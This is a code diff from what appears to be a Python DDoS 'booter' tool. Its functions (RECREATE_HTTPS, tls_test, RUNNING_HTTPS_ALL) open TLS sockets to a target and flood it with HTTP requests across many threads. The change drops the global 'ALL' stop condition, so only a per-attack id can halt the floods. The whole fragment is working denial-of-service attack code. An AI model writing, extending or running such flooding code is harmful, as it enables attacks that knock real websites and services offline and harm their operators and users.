@@ -257,7 +257,7 @@ def RECREATE_HTTPS(target,booter,METHODS,id):
         byt2 = f"{METHODS} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
         for _ in range(booter):
 
-            if stop_command == id or stop_command.upper() == 'ALL':
+            if stop_command == id:
               break
 
             ssl_sock.sendall(byt2)
@@ -282,7 +282,7 @@ def RUNNING_TCP(ip,port,time,spam_send,booter,size,id):
 def tls_test(target, run_time,methods,id):
     global stop_command
     for _ in range(int(run_time)):
-        if stop_command == id or stop_command.upper() == 'ALL':
+        if stop_command == id:
             break
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -312,7 +312,7 @@ def tls_test(target, run_time,methods,id):
             byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
             for _ in range(500):
-                if stop_command == id or stop_command.upper() == 'ALL':
+                if stop_command == id:
                     break
                 ssl_sock.sendall(byt2)
                 ssl_sock.send(byt)
@@ -323,7 +323,7 @@ def tls_test(target, run_time,methods,id):
 def RUNNING_HTTPS_ALL(methods_leak,thread_made,target,time_booter,METHODS,id):
    global stop_command
    for _ in range(int(thread_made)):
-        if stop_command == id or stop_command.upper() == 'ALL':
+        if stop_command == id:
             break
         if methods_leak == 'RECREATE_HTTPS':
            threading.Thread(target=RECREATE_HTTPS, args=(target, time_booter,METHODS,id)).start()
